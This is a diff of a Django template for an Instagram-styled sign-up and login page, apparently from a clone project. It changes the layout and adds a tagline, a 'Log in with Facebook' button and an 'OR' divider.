@@ -1,10 +1,9 @@
 {% extends "registration/base.html" %} 
 {% load crispy_forms_tags %}
 {% block content %}
-<div class="mylogin1">
+<div class="mylogin1 mylogin2">
     <span id="root">
         <section class="section-all">
-    
           <!-- 1-Role Main -->
           <main class="main" role="main">
             <div class="wrapper">
@@ -12,7 +11,14 @@
                 <div class="content">
                   <div class="login-box">
                     <div class="header">
-                      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                      <div class="text-center">
+                        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                      </div>
+                      <h2 class="col1">Sign up to see photos and videos from your friends.</h2>
+                      <span class="button-box">
+                          <button class="btn" type="submit" name="submit">Log in with Facebook</button>
+                        </span> 
+                        <h2 class="text-center myor"><span><small>OR</small> </span></h2> 
                     </div><!-- Header end -->
                     <div class="form-wrap">
                       <form class="form" method="POST">
@@ -50,7 +56,7 @@
           </main>
     
           <!-- 2-Role Footer -->
-          <footer class="footer myfoot" role="contentinfo">
+          <footer class="footer myfoot2" role="contentinfo">
             <div class="footer-container">
     
               <nav class="footer-nav" role="navigation">
